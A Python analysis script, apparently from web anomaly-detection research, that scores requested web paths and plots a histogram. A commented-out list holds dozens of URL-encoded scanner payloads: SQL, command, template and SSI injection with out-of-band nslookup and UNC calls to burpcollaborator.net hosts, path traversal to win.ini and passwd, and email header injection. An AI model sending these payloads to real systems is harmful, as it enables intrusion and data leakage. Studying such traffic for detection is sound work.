import numpy as np
from matplotlib import pyplot as plt

#sec2sec
#path_reliabilities_tuple = [('history.php', 1.0), ('transactions.php', 1.0), ('api.php', 1.0), ('userinfo.php', 0.2), ('portal.php', 0.6), ('login.php', 0.2), ('logout.php', 0.2), ('Pe-icon-7-stroke.woff', 1.0), ('fontawesome-webfont.woff', 1.0), ('glyphicons-halflings-regular.woff2', 1.0), ('clientaccesspolicy.xml', 0.2), ('crossdomain.xml', 0.2), ('robots.txt', 0.2), ('trace.axd', 0.2), ('/', 0.8), ('api.php', 1.0), ('kl5gi89o8z', 0.19999999999999998), ("(select%20extractvalue(xmltype('%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20ihiij%20SYSTEM%20%22http%3A%2F%2F6x4iekwyo4wikcfvx4ksle4u1l7d619p3cv0k.burpcollab'%7C%7C'orator.net%2F%22%3E%25ihiij%3B%5D%3E')%2C'%2Fl')%20from%20dual)", 0.19999999999999998), ("1'%7C%7C(select%20extractvalue(xmltype('%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20ihiij%20SYSTEM%20%22http%3A%2F%2Fvrq789qnitq7e19krtehf3yjva120q4ey1qpf.burpcollab'%7C%7C'orator.net%2F%22%3E%25ihiij%3B%5D%3E')%2C'%2Fl')%20from%20dual)%7C%7C'", 0.19999999999999998), ("1%3Bdeclare%20@q%20varchar(99)%3Bset%20@q%3D'%5C%5Ct0u5h7zlrrz5nzii0rnfo17h48a09o0eo8b0zp.burpcollab'%2B'orator.net%5Cuku'%3B%20exec%20master.dbo.xp_dirtree%20@q%3B--%20", 0.19999999999999998), ("1'%3Bdeclare%20@q%20varchar(99)%3Bset%20@q%3D'%5C%5C3jnf0hiva1if691sj16p7bqrnitasyjp7jubi0.burpcollab'%2B'orator.net%5Cqwf'%3B%20exec%20master.dbo.xp_dirtree%20@q%3B--%20", 0.19999999999999998), ("1)%3Bdeclare%20@q%20varchar(99)%3Bset%20@q%3D'%5C%5Cwnn84amoeum8a25lnuaib4ukrbx3wrnjbdy5mu.burpcollab'%2B'orator.net%5Cxxu'%3B%20exec%20master.dbo.xp_dirtree%20@q%3B--%20", 0.19999999999999998), ("1')%3Bdeclare%20@q%20varchar(99)%3Bset%20@q%3D'%5C%5Czwzbddvrnxvbj5eowxjlk73n0e665uwnkh79vy.burpcollab'%2B'orator.net%5Chwb'%3B%20exec%20master.dbo.xp_dirtree%20@q%3B--%20", 0.19999999999999998), ("(select%20load_file('%5C%5C%5C%5Cl6sxnz5dxj5xtroa6jt7utd9a0gsfg6iuch45t.burpcollaborator.net%5C%5Cdek'))", 0.19999999999999998), ("1'%2B(select%20load_file('%5C%5C%5C%5Cdfwpwre56bep2jx2fb2z3lm1jspko8fb35qxem.burpcollaborator.net%5C%5Cici'))%2B'", 0.19999999999999998), ("1%20into%20outfile%20'%5C%5C%5C%5Cqnh244mieom2aw5fnoacbyuer5xxwlnpbjybm0.burpcollaborator.net%5C%5Cbjt'%3B%20--%20", 0.19999999999999998), ("1'", 0.39999999999999997), ("1''", 0.39999999999999997), ('(select*from(select(sleep(20)))a)', 0.19999999999999998), ('1%2B(select*from(select(sleep(20)))a)%2B', 0.19999999999999998), ('1%20and%20(select*from(select(sleep(20)))a)--%20', 0.19999999999999998), ("1%20waitfor%20delay'0%3A0%3A20'--", 0.19999999999999998), ("1)waitfor%20delay'0%3A0%3A20'--", 0.19999999999999998), ("1%2C0)waitfor%20delay'0%3A0%3A20'--", 0.19999999999999998), ('150470837%20or%201535%3D01535', 0.19999999999999998), ('189325721%20or%204844%3D4851', 0.19999999999999998), ('198355041%20or%207934%3D07934--%20', 0.19999999999999998), ('129916913%20or%208239%3D8241--%20', 0.19999999999999998), ('1%20and%206596%3D06596', 0.19999999999999998), ('1%20and%202288%3D2297', 0.19999999999999998), ('1%20and%202139%3D02139--%20', 0.19999999999999998), ('1%20and%205132%3D5136--%20', 0.19999999999999998), ("195100646'%20or%20'3006'%3D'3006", 0.19999999999999998), ("139580059'%20or%20'7228'%3D'7231", 0.19999999999999998), ("187196161'%20or%206666%3D6666--%20", 0.19999999999999998), ("135703212'%20or%209800%3D9806--%20", 0.19999999999999998), ("1'%20and%20'4216'%3D'4216", 0.19999999999999998), ("1'%20and%20'5094'%3D'5100", 0.19999999999999998), ("1'%20and%207560%3D7560--%20", 0.19999999999999998), ("1'%20and%203493%3D3499--%20", 0.19999999999999998), ('1%22', 0.19999999999999998), ('rhqpm$%7B880*846%7Dhewpa', 0.19999999999999998), ('vyzbt%7B%7B205*653%7D%7Dqcxn5', 0.19999999999999998), ("1%7D%7Dsotzl'%2F%22%3Cwzff3", 0.19999999999999998), ("1%25%7Deu35w'%2F%22%3Cqoo15", 0.19999999999999998), ("1eeaqd%25%3Epg2e2'%2F%22%3Cigeng", 0.19999999999999998), ("eval(compile('for%20x%20in%20range(1)%3A%5Cn%20import%20time%5Cn%20time.sleep(20)'%2C'a'%2C'single'))", 0.19999999999999998), ("(function()%7Bif(typeof%20sfcu5%3D%3D%3D'undefined')%7Bvar%20a%3Dnew%20Date()%3Bdo%7Bvar%20b%3Dnew%20Date()%3B%7Dwhile(b-a%3C20000)%3Bsfcu5%3D1%3B%7D%7D())", 0.19999999999999998), ("1'%2B(function()%7Bif(typeof%20m5m7u%3D%3D%3D%22undefined%22)%7Bvar%20a%3Dnew%20Date()%3Bdo%7Bvar%20b%3Dnew%20Date()%3B%7Dwhile(b-a%3C20000)%3Bm5m7u%3D1%3B%7D%7D())%2B'", 0.19999999999999998), ("%22--%3E'--%3E%60--%3E%3C!--%23set%20var%3D%228wu%22%20value%3D%227vtjcluzm5%22--%3E%3C!--%23set%20var%3D%22ayw%22%20value%3D%229xvlenw1o7%22--%3E%3C!--%23echo%20var%3D%228wu%22--%3E%3C!--%23echo%20var%3D%22ayw%22--%3E%3C!--%23exec%20cmd%3D%22nslookup%20-q%3Dcname%20uig6z8hm9sh6500jis5g62pim9s1rpjn7hu9iy.burpcollaborator.net%22%20--%3E", 0.19999999999999998), ('1%0D%0ABCC%3As0t4h6zkrqz4nyih0qneo07g47az9n1gpac20r@burpcollaborator.net%0D%0Atdw%3A%20z', 0.19999999999999998), ('1%3E%0D%0ABCC%3Av517m94nwt47s1nk5tsht3cj9af2eq6kueh65v@burpcollaborator.net%0D%0Ahah%3A%20x', 0.19999999999999998), ('21zkdkwij1', 0.2), ('api.phpsnu0y8ukoj', 0.2), ("l')%20from%20dual)", 0.2), ("l')%20from%20dual)%7C%7C'", 0.2), ("api.php%3Bdeclare%20@q%20varchar(99)%3Bset%20@q%3D'%5C%5Cosk092rgjmr0fuadsmfagwzcw32v1js9g08nybn.burpcollab'%2B'orator.net%5Cauz'%3B%20exec%20master.dbo.xp_dirtree%20@q%3B--%20", 0.2), ("api.php'%3Bdeclare%20@q%20varchar(99)%3Bset%20@q%3D'%5C%5Co7w0o26gym60uupd7muavwecb3hvgj7av1nodc2.burpcollab'%2B'orator.net%5Cdgh'%3B%20exec%20master.dbo.xp_dirtree%20@q%3B--%20", 0.2), ("api.php)%3Bdeclare%20@q%20varchar(99)%3Bset%20@q%3D'%5C%5Cc4holq34va3orim14aryskb08rejd74zsqkda1z.burpcollab'%2B'orator.net%5Cctq'%3B%20exec%20master.dbo.xp_dirtree%20@q%3B--%20", 0.2), ("api.php')%3Bdeclare%20@q%20varchar(99)%3Bset%20@q%3D'%5C%5C121djf1ttz1dp7kq2zpnq99p6gc8bw2pqgi38rx.burpcollab'%2B'orator.net%5Cvsj'%3B%20exec%20master.dbo.xp_dirtree%20@q%3B--%20", 0.2), ("(select%20load_file('%5C%5C%5C%5C345flh3vv13fr9ms41rpsbbr8ieady40srkea2z.burpcollaborator.net%5C%5Cotz'))", 0.2), ("api.php'%2B(select%20load_file('%5C%5C%5C%5C7t1jalszk5sjgdbwt5gthf0vxm3e22t5hw9jz7o.burpcollaborator.net%5C%5Cdbg'))%2B'", 0.2), ("api.php'", 0.4), ("api.php''", 0.4), ("api.php'(select*from(select(sleep(20)))a)'", 0.2), ("api.php'%2B(select*from(select(sleep(20)))a)%2B'", 0.2), ("api.php'%20and%20(select*from(select(sleep(20)))a)--%20", 0.2), ('api.php%2C(select*from(select(sleep(20)))a)', 0.2), ("api.php'%20waitfor%20delay'0%3A0%3A20'--", 0.2), ("api.php')waitfor%20delay'0%3A0%3A20'--", 0.2), ("api.php'%2C0)waitfor%20delay'0%3A0%3A20'--", 0.2), ("api.php29182204'%20or%20'8314'%3D'8314", 0.2), ("api.php13634617'%20or%20'4416'%3D'4424", 0.2), ("api.php53379022'%20or%209234%3D9234--%20", 0.2), ("api.php48549457'%20or%204837%3D4845--%20", 0.2), ("api.php'%20and%20'2811'%3D'2811", 0.2), ("api.php'%20and%20'8528'%3D'8531", 0.2), ("api.php'%20and%202382%3D2382--%20", 0.2), ("api.php'%20and%204777%3D4786--%20", 0.2), ('api.php%22', 0.2), ('mrd3y$%7B535*665%7Dkn3ud', 0.2), ('s1s5h%7B%7B707*357%7D%7Dgodon', 0.2), ('%22%3Cymj6t', 0.2), ('%22%3Cv2fud', 0.2), ('%22%3Cthyy3', 0.2), ("api.php'%2Bsleep(20.to_i)%2B'", 0.2), ("api.php'%2Beval(compile('for%20x%20in%20range(1)%3A%5Cn%20import%20time%5Cn%20time.sleep(20)'%2C'a'%2C'single'))%2B'", 0.2), ("eval(compile('for%20x%20in%20range(1)%3A%5Cn%20import%20time%5Cn%20time.sleep(20)'%2C'a'%2C'single'))", 0.2), ("api.php'.sleep(20).'", 0.2), ('api.php%7B$%7Bsleep(20)%7D%7D', 0.2), ('57ahoj6xy36hubpu73urvdetbkhcg08ozgm6av.burpcollaborator.net', 0.2), ('%3Fapi.php', 0.2), ('api.php%7Cnslookup%20-q%3Dcname%20ylna2ckqcwka843nlw8k96smpdv5utqhh94zso.burpcollaborator.net.%26', 0.2), ("api.php'%22%600%26nslookup%20-q%3Dcname%20b3fnkp23u92nqhl039qxrjaz7qdic69u0mncb1.burpcollaborator.net.%26%60'", 0.2), ("api.php%26nslookup%20-q%3Dcname%20435gki2wu22gqalt32qqrcas7jdbcz7nyfl59u.burpcollaborator.net.%26'%5C%22%600%26nslookup%20-q%3Dcname%20435gki2wu22gqalt32qqrcas7jdbcz7nyfl59u.burpcollaborator.net.%26%60'", 0.2), ("api.php%7Cecho%20qa04v11fk2%20k7s2an60gl%7C%7Ca%20%23'%20%7Cecho%20qa04v11fk2%20k7s2an60gl%7C%7Ca%20%23%7C%22%20%7Cecho%20qa04v11fk2%20k7s2an60gl%7C%7Ca%20%23", 0.2), ('api.php%26echo%20sezkl6csmh%20z8efpyewj5%26', 0.2), ('api.php%22%7Cecho%204l5k4ad3cs%20gwx0f9gg0x%20%7C%7C', 0.2), ("api.php'%7Cecho%20o65o7j5n3l%20edi6ed9hm1%20%23xzwx", 0.2), ("api.php%7Cping%20-n%2021%20127.0.0.1%7C%7C%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7Cping%20-n%2021%20127.0.0.1%7C%7C%60ping%20-c%2021%20127.0.0.1%60%20%23%5C%22%20%7Cping%20-n%2021%20127.0.0.1", 0.2), ('api.php%7Cping%20-c%2021%20127.0.0.1%7C%7Cx', 0.2), ('api.php%26ping%20-n%2021%20127.0.0.1%26', 0.2), ("api.php'%7Cping%20-c%2021%20127.0.0.1%20%23", 0.2), ('api.php%22%7Cping%20-n%2021%20127.0.0.1%20%7C%7C', 0.2), ('..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini', 0.2), ('c%3A%5Cwindows%5Cwin.ini', 0.2), ('api.php..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini', 0.2), ('..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini%00api.php', 0.2), ('passwd', 0.2), ('qtk%3E', 0.2), ('ouu%3E', 0.2), ('api.php%5D%5D%3E%3E%3C', 0.2), ("api.php'%2B(function()%7Bif(typeof%20lrzcz%3D%3D%3D%22undefined%22)%7Bvar%20a%3Dnew%20Date()%3Bdo%7Bvar%20b%3Dnew%20Date()%3B%7Dwhile(b-a%3C20000)%3Blrzcz%3D1%3B%7D%7D())%2B'", 0.2), ("%22--%3E'--%3E%60--%3E%3C!--%23set%20var%3D%22b9a%22%20value%3D%22a89mpo72z8%22--%3E%3C!--%23set%20var%3D%22dbc%22%20value%3D%22caborq941a%22--%3E%3C!--%23echo%20var%3D%22b9a%22--%3E%3C!--%23echo%20var%3D%22dbc%22--%3E%3C!--%23exec%20cmd%3D%22nslookup%20-q%3Dcname%20xvw9cbupmvu9i3dmvvijj52lzc544swqkhc42sr.burpcollaborator.net%22%20--%3E", 0.2), ('api.php%0D%0ABCC%3Aii4uzwha9ghu5o07ig546qp6mxsprdj67xzkp8e@burpcollaborator.net%0D%0Auoc%3A%20b', 0.2), ('api.php%3E%0D%0ABCC%3Akymwfyxcpixwlqg9yil6ms582z8r7fz9n0fn5bu@burpcollaborator.net%0D%0Avvf%3A%20h', 0.2), ('api.php', 0.2), ('passwd', 0.39999999999999997), ('passwd%00api.php', 0.19999999999999998)]
path_reliabilities_tuple = [('anadir.jsp', 0.036764705882352935), ('autenticar.jsp', 0.014705882352941175), ('pagar.jsp', 0.036764705882352935), ('vaciar.jsp', 0.014705882352941175), ('registro.jsp', 0.036764705882352935), ('asf-logo-wide.gif~', 0.0036764705882352936), ('.BAK', 0.0036764705882352936), ('asf-logo-wide', 0.0036764705882352936), ('entrar.jsp', 0.036764705882352935), ('caracteristicas.jsp', 0.011029411764705883), ('4861362529278789730.OLD', 0.0036764705882352936), ('.OLD', 0.0036764705882352936), ('productos.jsp.Inc', 0.0036764705882352936), ('imagenes.BAK', 0.0036764705882352945), ('asf-logo-wide.gif.old', 0.0036764705882352945), ('6909030637832563290.jsp.old', 0.0036764705882352945), ('ogono.jpg.old', 0.0036764705882352945), ('.inc', 0.0036764705882352945), ('castro.jpg.Inc', 0.0036764705882352945), ('asf-logo-wide.OLD', 0.0036764705882352945), ('asf-logo-wide', 0.0036764705882352945), ('zarauz.jpg', 0.03676470588235294), ('castro.jpg', 0.03676470588235294), ('ogono.jpg', 0.03676470588235294), ('index.jsp', 0.03676470588235294), ('index.jsp.INC', 0.0036764705882352945), ('editar.jsp', 0.03676470588235294), ('4861362529278789730.INC', 0.0036764705882352945), ('asf-logo-wide~', 0.0036764705882352945), ('.old', 0.0036764705882352945), ('salir.jsp.Inc', 0.0036764705882352945), ('salir.jsp', 0.03676470588235294), ('asf-logo-wide', 0.011029411764705883), ('1.gif.BAK', 0.0036764705882352945), ('logo.gif.old', 0.0036764705882352945), ('6909030637832563290.jsp', 0.0036764705882352945), ('1.gif.OLD', 0.0036764705882352945), ('4861362529278789730', 0.0036764705882352945), ('6909030637832563290.jsp.OLD', 0.0036764705882352945), ('nuestratierra.jpg', 0.03676470588235294), ('3.gif', 0.03676470588235294), ('.OLD', 0.0036764705882352945), ('2.gif.INC', 0.0036764705882352945), ('3.gif.Old', 0.0036764705882352945), ('asf-logo-wide.gif', 0.0036764705882352945), ('4861362529278789730.bak', 0.0036764705882352945), ('3.gif.Inc', 0.0036764705882352945), ('4861362529278789730', 0.0036764705882352945), ('1.gif', 0.03676470588235294), ('2.gif', 0.03676470588235294), ('cmenbul.gif', 0.03676470588235294), ('logo.gif', 0.03676470588235294), ('asf-logo-wide.java', 0.0036764705882352945), ('6909030637832563290.jsp', 0.0036764705882352945), ('6909030637832563290.jsp.INC', 0.0036764705882352945), ('estilos.css.INC', 0.0036764705882352945), ('asf-logo-wide.gif', 0.007352941176470589), ('estilos.css.Bak', 0.0036764705882352945), ('menum.jsp', 0.03676470588235294), ('titulo.jsp', 0.03676470588235294), ('estilos.css', 0.03676470588235294), ('4861362529278789730.java', 0.0036764705882352936), ('global.inc', 0.0036764705882352936), ('asf-logo-wide.gif', 0.007352941176470587), ('4861362529278789730.bak', 0.0036764705882352936), ('asf-logo-wide.BAK', 0.0036764705882352936), ('asf-logo-wide.Bak', 0.0036764705882352936), ('asf-logo-wide.java', 0.0036764705882352936), ('4861362529278789730.OLD', 0.0036764705882352936), ('6909030637832563290.jsp', 0.0036764705882352936), ('index.jsp', 0.03676470588235294), ('iisstart.htm', 0.003676470588235294), ('home.jsp', 0.007352941176470588), ('6909030637832563290.jsp.OLD', 0.003676470588235294), ('achg.htr', 0.003676470588235294), ('mkilog.exe', 0.003676470588235294), ('WebservicesEJB.jsp', 0.003676470588235294), ('index.html', 0.007352941176470588), ('names.nsf', 0.003676470588235294), ('asf-logo-wide', 0.003676470588235294), ('SimpleQuery_VBScript.asp', 0.0036764705882352936), ('MultiScrolling_VBScript.asp', 0.0036764705882352936), ('LimitRows_VBScript.asp', 0.0036764705882352936), ('toolbar.asp', 0.003676470588235294), ('.old', 0.003676470588235294), ('Login.portal', 0.003676470588235294), ('6909030637832563290.jsp', 0.003676470588235294), ('shtml.dll', 0.003676470588235294), ('logon.jsp', 0.003676470588235294), ('login.do', 0.003676470588235294), ('.Inc', 0.003676470588235294), ('index.html', 0.003676470588235294), ('/', 0.003676470588235294), ('tienda1.INC', 0.003676470588235294), ('asf-logo-wide.java', 0.003676470588235294), ('about.htm', 0.003676470588235294), ('adcjavas.inc', 0.003676470588235294), ('4861362529278789730', 0.003676470588235294), ('tienda1.OLD', 0.003676470588235294), ('anadir.jsp', 0.036764705882352935), ('autenticar.jsp', 0.036764705882352935), ('caracteristicas.jsp', 0.036764705882352935), ('entrar.jsp', 0.036764705882352935), ('pagar.jsp', 0.036764705882352935), ('registro.jsp', 0.036764705882352935), ('vaciar.jsp', 0.036764705882352935), ('editar.jsp', 0.036764705882352935)]
path_reliabilities = []
for t in path_reliabilities_tuple:
    path_reliabilities.append(t[1])

print(path_reliabilities)
val_under = np.percentile(path_reliabilities, 60)
val_upper = np.percentile(path_reliabilities, 90)
print(val_under)
alert_paths =[]
no_alert_paths = []
for t in path_reliabilities_tuple:
    if t[1]<=val_under:
        #print(t)
        alert_paths.append(t[1])
    else:
        no_alert_paths.append(t[1])
    if t[1]>=val_upper:
        print(t)

plt.hist([alert_paths,no_alert_paths], color=['Red', 'Blue'],bins=10)
plt.title("Path Reliabilities")
plt.xlabel("Reliability")
plt.ylabel("Number of different Resources")
plt.show()

